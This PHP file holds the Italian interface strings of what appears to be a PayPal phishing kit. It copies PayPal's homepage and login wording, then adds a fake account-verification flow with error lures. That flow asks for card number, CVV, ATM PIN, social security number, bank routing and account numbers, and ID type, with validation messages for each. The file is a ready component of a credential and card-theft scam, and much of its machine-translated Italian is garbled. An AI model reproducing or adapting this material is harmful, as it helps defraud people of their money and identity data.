<?php 

$confirmbutton = "confermare";
$confirmyourinfo = "È necessario confermare le informazioni per essere in grado di risolvere questo problema e l'accesso al tuo conto";
$unabletoload = "Temporaneamente in grado di caricare il conto.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Tutti i diritti riservati.";
$wrong = "Alcune informazioni inserita non è giusto.";
$titlerr = "Errore: Accesso";
$confirm = "Conferma il tuo account Usalo come più vi piace";
$topp = "La tua sicurezza è la nostra priorità";
$secondarycred = "Secondary Credit Card (optional)";
$primarycred = "Carta di credito principale";
$thiscardis = "Questa scheda è VBV / MSC";

 
$page="it_IT";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$country_selector = "country italy";
$top_title = "Pagare, trasferire denaro e accettare pagamenti online - PayPal Italia";
$small_with_helper_input_0 = "Inserisci un indirizzo email valido.";
$small_with_helper_input_1 = "Password dimenticata?";
$login_email_input_0 = "Indirizzo email";
$passwordRecovery1_a_0 = "Hai dimenticato l'indirizzo email?";
$login_password_input_0 = "Password";
$passwordRecovery2_a_0 = "Password dimenticata?";
$login_button_a_0 = "Accedi";
$signup_button_a_0 = "Registrati";
$header_buy_a_0 = "Acquista";
$header_sell_a_0 = "Vendi";
$header_send_a_0 = "Invia";
$header_business_a_0 = "Business";
$signup_button_inner_a_0 = "Registrati";
$hero_h1_0 = "Il tuo denaro con te. Sempre.";
$SignUp_consumer_hero_input_0 = "Registrati gratis";
$signup_subline_p_0 = "Hai un'impresa? Apri un conto Business ";
$icon_help_a_0 = "Aiuto";
$icon_contact_a_0 = "Contattaci";
$icon_search_button_0 = "Cerca";
$_large_h2_n1_0 = "Semplice e veloce.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Accettare le carte non è mai stato così facile.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Invia denaro a chi vuoi, dove vuoi.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Richiedi denaro in pochi clic.";
$contentPara_p_n1_0 = "Milioni di clienti usano PayPal per un semplice motivo: è facile. Inserisci solo email e password e in pochi clic il pagamento è completato. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Invia denaro in qualsiasi angolo del mondo a chiunque abbia un’email o un numero di cellulare. Sarà felice di ricevere il tuo messaggio. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Richiedi denaro in modo semplice e veloce. Il destinatario potrà pagarti comodamente tramite saldo PayPal o carta. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Vendi online? Inizia subito ad accettare le principali carte. Dall'inizio alla fine, pensiamo a tutto noi. Così puoi dedicarti ai tuoi clienti. ";
$contentLink_a_n1_0 = "Compra su eBay";
$contentLink_a_n1_1 = "Fai shopping online";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Invia denaro";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Richiedi denaro";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Accetta pagamenti online";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Ricevi pagamenti via email";
$closingHeadline_headline_large_p_0 = "Semplificati la vita.";
$btn_closing_cta_center_block_span4_a_0 = "Registrati gratis";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Aiuto";
$footer_footer_main_secondaryLink_li[1] = "Contattaci";
$footer_footer_main_secondaryLink_li[2] = "Tariffe";
$footer_footer_main_secondaryLink_li[3] = "Sicurezza";
$footer_footer_main_secondaryLink_li[4] = "Shopping";
$footer_footer_main_secondaryLink_li[5] = "See all countries";
$footer_footer_main_secondaryLink_li[6] = "Cerca      ";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Chi siamo";
$footer_footer_secondary_secondaryLink_li[1] = "Lavora con noi";
$footer_footer_secondary_secondaryLink_li[2] = "eBay";
$footer_footer_secondary_secondaryLink_li[3] = "Sviluppatori ";
$footer_footer_secondary_secondaryLink_li[4] = "Partner";
$footer_footer_secondary_secondaryLink_li[5] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999 - ".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Privacy";
$footer_footer_tertiary_secondaryLink_li[2] = "Accordi legali";

$top_title2 = "Errore - Accedi Italia - PayPal";
$alert_alert_warning_div_0 = "Devi immettere l’indirizzo email e la password. Riprova.";
$loginheadline_p_0 = "Accedi al tuo conto";
$error_span_0 = "Indirizzo email";
$error_span_1 = "Password";
$btn_large_input_0 = "Accedi";
$pwrLinkoldflow_a_0 = "Hai dimenticato l'indirizzo email o la password?";
$btn_btn_secondary_large_a_0 = "Registrati gratis";
$headline_p_0 = "Scegli tu come pagare.<SPAN class=headline-content>Paga con una delle tue carte o con il saldo PayPal. A te la scelta.</SPAN>";
$headline_p_1 = "Semplice. E in genere gratuito.<SPAN class=headline-content>Aprire un conto PayPal è gratuito e non paghi tariffe quando fai acquisti, non importa come decidi di pagare.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Chi siamo";
$footer_li_footer_li[1] = "Tipi di conto";
$footer_li_footer_li[2] = "Tariffe";
$footer_li_footer_li[3] = "Privacy";
$footer_li_footer_li[4] = "Spazio Sicurezza";
$footer_li_footer_li[5] = "Contattaci";
$footer_li_footer_li[6] = "Accordi legali";
$footer_li_footer_li[7] = "Sviluppatori";
$footer_li_footer_li[8] = "PayPal Mobile";
$footer_li_footer_li[9] = "Negozi PayPal";
$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Tutti i diritti riservati.";

$charset = "utf-8";
$profupdate = "Profile Update - PayPal";
$processing = "Login è saldamente";
$opay = "Registrazione in - PayPal";
$ifno = "se questa pagina viene visualizzata per più di 5 secondi,";
$clickhere = "Clicca qui";
$reload = "per ricaricare.";
$logout = "Logout";
$help = "Aiuto";
$s_center = "Spazio Sicurezza";
$myacc = "Il mio account";

$charset = "utf-8";
$profupdate = "Profile Update - PayPal";
$processing = "Login è saldamente";
$ifno = "se questa pagina viene visualizzata per più di 5 secondi,";
$reload = "per ricaricare.";
$logout = "Logout";
$help = "Aiuto";
$s_center = "Spazio Sicurezza";
$myacc = "Il mio account";
$over = "Panoramica";
$addfound = "Aggiungi fondi";
$retirar = "Ritirarsi";
$banktf = "Trasferimento su conto bancario";
$history = "Storia";
$bsearch = "Ricerca di base";
$dhistory = "Scarica History";
$resolu = "Risoluzione centro";
$opencase = "Mostra i casi aperti";
$guides = "Guida";
$prof = "Profilo";
$addemail = "Aggiungi o modifica Email";
$addbank = "Aggiungi o modifica conto bancario";
$addcard = "Aggiungi o modifica carta di credito";
$addadr = "Aggiungi o modifica indirizzo postale";
$sendmoney = "Invia denaro";
$reqmoney = "Richiesta di denaro";
$mservices = "Merchant Services";
$autools = "All'asta gli strumenti";
$stra = "Sicuro di transazione";
$puf = "Aggiornamento di profilo";
$pip = "Informazioni personali profilo";
$acu = "Inserisci le informazioni nel modo più accurato possibile.";
$accu = "Assicurati di inserire le informazioni con precisione e secondo i formati richieste.";
$filla = "Compilare tutti i campi obbligatori.";
$rfield = "Campo obbligatorio";
$ffPrenom = "Nome";
$ffNom = "cognome";
$dateness = "data di nascita";
$month = "Mese";
$day = "Giorno";
$year = "Anno";
$adr1 = "indirizzo linea 1";
$adr2 = "indirizzo linea 2";
$city = "città";
$state = "stato";
$zip = "codice di avviamento postale";
$country = "paese";
$scountry = "-selezionare paese-";
$hpn = "numero di telefono di casa";
$acpnum = "questo numero verrà utilizzato per contattare l'utente circa le misure di sicurezza e/o altre questioni riguardanti il tuo account PayPal.";
$ccprof = "Profilo di carta di credito";
$damelacc = "Inserire informazioni sulla carta più accuratamente possibile.";
$damelacb = "numero della carta, immettere numeri solo per favore, senza trattini o spazi.";
$Nomdutitulairedelacarte = "Nome della carta";
$ccnumbr = "numero di schede";
$expbr = "data di scadenza";
$cvv = "numero di verifica della scheda";
$hcvv = "Aiuto per trovare il numero di verifica della carta";
$atmm = "il tuo PIN ATM";
$ssn = "numero di previdenza sociale";
$routing = "numero di Routing della Banca";
$account = "numero di conto bancario";
$hrouting = "Aiuto per trovare il vostro numero di Routing della banca";
$haccount = "Aiuto per trovare il tuo numero di conto bancario";
$codepersonel = "codice di sicurezza";
$IDTYPE = "Seleziona il tipo di Id";
$Passport = "Passaporto";
$Card_Identification = "Scheda di identificazione";
$Driving_License = "Patente";
$for1 = "Per la vostra protezione, verifichiamo informazioni sulla carta di credito.";
$for2 = "il processo in genere richiede circa 30 secondi, ma si può prendere più durante determinati periodi del giorno. Si prega di cliccare ";
$for3 = "per aggiornare le vostre informazioni.";
$spo = "Salva profilo";
$t1 = "Ulteriori informazioni";
$t2 = "chi siamo";
$t3 = "Feedback del sito";
$t4 = "Tasse";
$t5 = "Privacy";
$t6 = "Centro di sicurezza";
$t7 = "Contatti";
$t8 = "Gli accordi legali";
$t9 = "Nel mondo";
$t10 = "Lavori";
$t11 = "Merchant Services";
$t12 = "Nostro Blog";
$t13 = "Labs";
$t14 = "Referral";
$t15 = "Mappa del sito";
$t16 = "eBay";
$t17 = "Comunitaria";
$fdic = "Informazioni su pass-through assicurazione FDIC";

$fdic = "Informazioni su pass-through assicurazione FDIC";
$myvar3 = "Si prega di compilare il modulo sottostante per aggiornare le informazioni del tuo profilo e ripristinare il tuo account di accesso.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("Inserisci il tuo nome"
,"Valido Nome" //--------
,"Inserisci il tuo Cognome"
,"Invalid Cognome" //--------
,"Seleziona un mese di nascita valido." //--------4
,"Seleziona un valido compleanno." //--------
,"Seleziona un anno di nascita valido." //--------
,"Inserisci il tuo indirizzo"
,"Indirizzo non valido" //--------8
,"Indirizzo non valido" //--------
,"Si prega di inserire il nome della tua città"
,"Si prega di inserire un nome di valido." //--------
,"Si prega di inserire un nome di valido." //--------12
,"Seleziona un Paese"
,"Inserisci il tuo codice di avviamento postale"
,"CAP valido." //--------15
,"Inserisci il tuo numero di telefono"
,"Inserire solo il numero"
,"Si prega di inserire un numero di telefono valido" //--------
,"Inserisci un nome valido del titolare" //--------19
,"Numero della carta è in formato non valido"  ////--------
,"Numero di carta di credito non è valido"  //--------
,""//--------22
,""//--------
,"Inserire solo il numero"
,"Si prega di selezionare la data di scadenza - Mese -"
,"Si prega di selezionare la data di scadenza - Anno -"
,"Inserisci il tuo indirizzo CVV"
,"Si prega di inserire un Cvv/Cvv2 valido per la scheda."//--------
,"Cvv/Cvv2 non valido" //--------
,"Si prega di inserire il PIN ATM"
,"Si prega di inserire un PIN ATM valido" //--------
,"Si prega di inserire un PIN ATM valido" //--------
,"Inserisci il tuo numero di previdenza sociale"
,"Valido numero di previdenza sociale."
,"Valido numero di previdenza sociale."
,"Il Social Security Number solo il numero"
,"Inserisci il tuo codice di sicurezza"
,"Invalid Secure Code");
$allcountry1 = "Siamo con te, ovunque tu sia.";
$allcountry2 = "PayPal è accettato in 193 Paesi e 26 valute. Fai shopping o ricevi denaro senza confini né barriere linguistiche. Il mondo è a portata di clic. ";
$One_moment = "Un momento...";

$your_money = "Ottieni il massimo dal vostro denaro";
$your_money_p = "Il tuo conto PayPal offre un modo più sicuro, più veloce e più conveniente per pagare online e sul tuo telefonino. Memorizza i tuoi dati finanziari in modo sicuro con noi quindi utilizzare il tuo account per acquistare, trasferire denaro o vendere la tua roba per fare qualche soldo extra - tutto in pochi clic.";
$websites = "Negozio a milioni di siti web";
$websites_p = "PayPal è disponibile su milioni di siti web in tutto il mondo. Quindi, se si sta acquistando dai più grandi rivenditori o più piccoli specialisti, si possono fare acquisti senza condividere i tuoi dati e la velocità attraverso checkout. E a seconda di quale dispositivo si sta utilizzando, la tua esperienza PayPal sarà altrettanto veloce e conveniente.";
$Simply_secure = "Semplicemente sicuro";
$Simply_secure_p = "La sicurezza è al centro di tutto ciò che facciamo. Che si tratti di proteggere i tuoi dati finanziari o i vostri acquisti, abbiamo messo la vostra sicurezza e la pace della mente per primo. Ecco perché usiamo la tecnologia leader di crittografia e anti-frode, perché monitoriamo le transazioni 24 ore al giorno e per questo siamo in grado di aiutarvi a ottenere i soldi indietro se il vostro acquisto non arriva o non corrisponde alla sua descrizione.";
$ex_date_info = "Vi preghiamo di darci la vostra data di scadenza della carta (MM/AAAA).";
$ex_date_empty = "Vi preghiamo di darci la data di scadenza della carta.";
$ex_date_format = "Si prega di inserire una data di scadenza valida (MM/AAAA).";
$cardholder_info = "Usa il tuo nome come indicato sulla carta";
$card_info = "Inserisci il tuo numero di carta";
$card_format = "Il numero della carta non è valido";
$atm_info = "Inserire il perno atm per questa scheda.";
$account_info = "Inserisci il tuo numero di conto bancario";
$account_empty = "Inserisci il tuo numero di conto bancario per verificare il tuo account";
$account_format = "Immettere un numero di conto bancario valido";
$routing_info = "Inserisci il tuo numero di routing banca";
$routing_empty = "Inserisci il tuo numero di routing banca per verificare il tuo account";
$routing_format = "Inserisci un numero di routing bancario valido";
$first_name = "Il tuo nome";
$first_name_info = "Usa il tuo nome legale, come indicato sulla patente di guida, carta di assicurazione nazionale o il passaporto.";
$first_name_empty = "Abbiamo bisogno del vostro nome legale per verificare il tuo account.";
$last_name = "Il tuo cognome";
$last_name_info = "Usa il tuo cognome legale, come indicato sulla patente di guida, carta di assicurazione nazionale o il passaporto.";
$last_name_empty = "Abbiamo bisogno del vostro legale cognome per verificare il tuo account.";
$Birth_date = "Data di nascita";
$Birth_date_empty ="Vi preghiamo di darci la vostra data di nascita.";
$Birth_date_format = "Si prega di inserire una data valida (GG/MM/AAAA).";
$Birth_date_info = "Vi preghiamo di darci la vostra data di nascita (GG/MM/AAAA).";
$Address1 = "Indirizzo Linea 1";
$Address1_empty = "Abbiamo bisogno di un indirizzo valido per verificare il tuo account.";
$Address1_info = "Non possiamo accettare caselle postali o indirizzi aziendali.";
$Address2 = "Indirizzo 2";
$City = "città";
$City_empty = "Abbiamo bisogno di una città/città per verificare il tuo account.";
$Postcode = "codice postale";
$Postcode_empty = "Abbiamo bisogno di un codice postale per creare un nuovo account per te.";
$Postcode_format = "Controlla il tuo codice postale per errori di battitura, il formato non sembra giusto.";
$fone = "Il tuo numero di telefono";
$fone_empty = "Abbiamo bisogno del vostro numero di telefono per verificare il tuo account.";
$fone_format = "Controlli prego il vostro numero di telefono per errori di battitura, il formato non sembra giusto.";
$fone_info = "Il tuo numero di telefono (si prega di utilizzare solo cifre)";
$verifyaccount = "Verifica il tuo conto";
$Ownb = "Possedere un business?";
$hh1 = "I vostri dati sicuri";
$hh2 = "I tuoi dati personali";
$pp1 = "Abbiamo bisogno dei vostri dati sicuri validi per verificare il tuo account.";
$pp2 = "Abbiamo bisogno di alcune informazioni su di voi prima di poter verificare il tuo account.";

$type1="Casa";
$type2="Mobile";
$button_continue="Continuare";
$button_validate="Verificare";
?>